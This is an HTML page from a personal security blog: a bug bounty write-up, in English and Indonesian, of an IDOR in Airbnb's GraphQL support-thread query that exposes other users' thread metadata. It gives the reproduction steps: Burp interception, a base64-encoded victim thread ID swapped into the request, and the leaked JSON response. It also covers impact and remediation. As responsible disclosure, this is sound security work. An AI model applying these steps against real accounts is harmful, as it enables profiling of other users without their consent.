@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Airbnb Thread Metadata Disclosure — Ahan Pahlevi</title>
+  <link rel="icon" href="../assets/favicon.ico" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+
+  <div class="cursor"></div>
+  <div class="cursor-dot"></div>
+
+  <nav>
+    <div class="nav-inner">
+      <div class="nav-logo"><span>~/</span>ahandotid<span class="blink">_</span></div>
+      <button class="nav-menu-btn">☰</button>
+      <ul class="nav-links">
+        <li><a href="../index.html">About</a></li>
+        <li><a href="../writeups.html" class="active">Writeups</a></li>
+        <li><a href="../projects.html">Projects</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="container">
+    <div class="article-wrapper">
+
+      <div class="article-header">
+        <div style="margin-bottom:1rem;">
+          <a href="../writeups.html" style="font-size:0.78rem;color:var(--text-dim);">← Back to Writeups</a>
+        </div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:1rem;">
+          <span class="card-category cat-web">Web</span>
+          <span class="card-category cat-osint">Bug Bounty</span>
+          <span class="card-category" style="background:rgba(255,211,42,0.1);color:var(--yellow);border:1px solid rgba(255,211,42,0.3);">Informative</span>
+        </div>
+        <h1 class="article-title">GraphQL Thread Metadata Disclosure — Airbnb</h1>
+        <div class="article-meta">
+          <span>📅 2025</span>
+          <span>⏱ 5 min read</span>
+          <span>🎯 HackerOne — Airbnb</span>
+          <span>👤 Ahan Pahlevi</span>
+        </div>
+      </div>
+
+      <div class="article-body">
+
+        <h2>Overview</h2>
+        <p>
+          While exploring Airbnb's support message system, I discovered that an authenticated user
+          can access partial metadata of another user's support thread by manipulating the
+          <code>globalThreadId</code> parameter in the <code>ViaductGetThreadAndDataQuery</code>
+          GraphQL endpoint. Although the report was closed as informative by Airbnb Security,
+          the finding demonstrates a real authorization inconsistency worth documenting.
+        </p>
+
+        <blockquote>
+          Airbnb Response: "Being able to know if a user has an active conversation does not
+          appear to pose a security risk." — Airbnb Security Team
+        </blockquote>
+
+        <h2>Vulnerability Summary</h2>
+        <p>
+          The server returns <code>HTTP 200</code> with partial thread metadata belonging to
+          other users when an unauthorized <code>globalThreadId</code> is supplied — instead
+          of returning a clean <code>HTTP 403</code>. Message content itself is protected,
+          but metadata leaks include:
+        </p>
+        <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
+          <li>Thread ID & existence confirmation</li>
+          <li>Inbox visibility status (<code>hiddenInInbox</code>) → reveals moderation status</li>
+          <li>Activity timestamps (<code>mostRecentInboxActivityAtMsFromROS</code>)</li>
+          <li>Profile images of support participants</li>
+        </ul>
+
+        <h2>Steps to Reproduce</h2>
+
+        <p><strong>Step 1</strong> — Siapkan dua akun Airbnb:</p>
+        <pre><code>Account A → Attacker
+Account B → Victim</code></pre>
+
+        <p><strong>Step 2</strong> — Login sebagai Account B, buka support chat dan catat thread ID dari URL:</p>
+        <pre><code>https://www.airbnb.com/guest/messages/2472328079
+                                              ^^^^^^^^^^
+                                              Thread ID</code></pre>
+
+        <p><strong>Step 3</strong> — Login sebagai Account A, intercept traffic dengan Burp Suite.
+        Browse ke halaman support untuk trigger request:</p>
+        <pre><code>GET /api/v3/ViaductGetThreadAndDataQuery</code></pre>
+
+        <p><strong>Step 4</strong> — Encode thread ID milik victim ke Base64:</p>
+        <pre><code>$ echo -n "MessageThread:2472328079" | base64
+TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5</code></pre>
+
+        <p><strong>Step 5</strong> — Di Burp Repeater, ganti nilai <code>globalThreadId</code>
+        dengan encoded thread ID milik victim, lalu send:</p>
+        <pre><code>GET /api/v3/ViaductGetThreadAndDataQuery/d8dbf8f7...
+  ?operationName=ViaductGetThreadAndDataQuery
+  &variables={"globalThreadId":"TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5"...}
+Cookie: [Account A session]</code></pre>
+
+        <h2>Response (HTTP 200 — Data Leak)</h2>
+        <pre><code>{
+  "data": {
+    "threadData": {
+      "id": "TWVzc2FnZVRocmVhZDoyNDcyMzI4MDc5",
+      "hiddenInInbox": true,
+      "inboxAccessibilityTemplateText": "You do not have access to this thread.",
+      "inboxProfileImages": [...],
+      "mostRecentInboxActivityAtMsFromROS": "0",
+      "fetchedAt": "1773610116970"
+    }
+  }
+}</code></pre>
+
+        <p>
+          Server mengembalikan <code>HTTP 200</code> dengan metadata thread milik Account B,
+          padahal Account A tidak memiliki akses. Inkonsistensi ini terjadi karena authorization
+          check hanya diterapkan pada level konten pesan, bukan pada level GraphQL resolver metadata.
+        </p>
+
+        <h2>Impact Analysis</h2>
+        <p>Meskipun konten pesan terlindungi, metadata yang bocor dapat digunakan untuk:</p>
+        <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
+          <li><strong>User profiling</strong> — konfirmasi apakah user memiliki support conversation aktif</li>
+          <li><strong>Moderation enumeration</strong> — <code>hiddenInInbox: true</code> mengindikasikan akun sedang dalam review</li>
+          <li><strong>Activity pattern analysis</strong> — timestamp aktivitas support terakhir bocor</li>
+          <li><strong>Attack chaining</strong> — enumerasi valid thread ID untuk serangan lanjutan</li>
+        </ul>
+
+        <h2>Remediation</h2>
+        <ul style="padding-left:1.5rem;margin-bottom:1.2rem;color:var(--text-dim);">
+          <li>Return <code>HTTP 403</code> untuk seluruh request ketika user tidak terotorisasi</li>
+          <li>Validasi thread ownership di server-side sebelum mengembalikan field apapun</li>
+          <li>Implementasi consistent authorization check di semua GraphQL field resolver</li>
+        </ul>
+
+        <h2>Lessons Learned</h2>
+        <blockquote>
+          Tidak semua temuan diterima sebagai valid vulnerability — dan itu wajar.
+          Yang penting adalah proses: enumerasi endpoint, analisis response behavior,
+          dan pelaporan yang terstruktur. Metadata disclosure sering dianggap low severity,
+          tapi dalam konteks yang tepat bisa menjadi bagian dari attack chain yang lebih besar.
+        </blockquote>
+
+        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:1.5rem;">
+          <span class="skill-badge">GraphQL</span>
+          <span class="skill-badge">IDOR</span>
+          <span class="skill-badge">Burp Suite</span>
+          <span class="skill-badge">Authorization Bypass</span>
+          <span class="skill-badge">Metadata Disclosure</span>
+          <span class="skill-badge">HackerOne</span>
+        </div>
+
+      </div>
+
+      <div style="display:flex;justify-content:space-between;padding:2rem 0;border-top:1px solid var(--border);margin-top:3rem;">
+        <a href="../writeups.html" class="btn btn-outline" style="font-size:0.78rem;">← All Writeups</a>
+      </div>
+
+    </div>
+  </div>
+
+  <footer>
+    <div class="footer-inner">
+      <div class="footer-text">Built with <span>♥</span> by <span>Ahan Pahlevi</span></div>
+      <div class="footer-text"><span>ahandotid</span>@CianjurSec ~ <span>2025</span></div>
+    </div>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
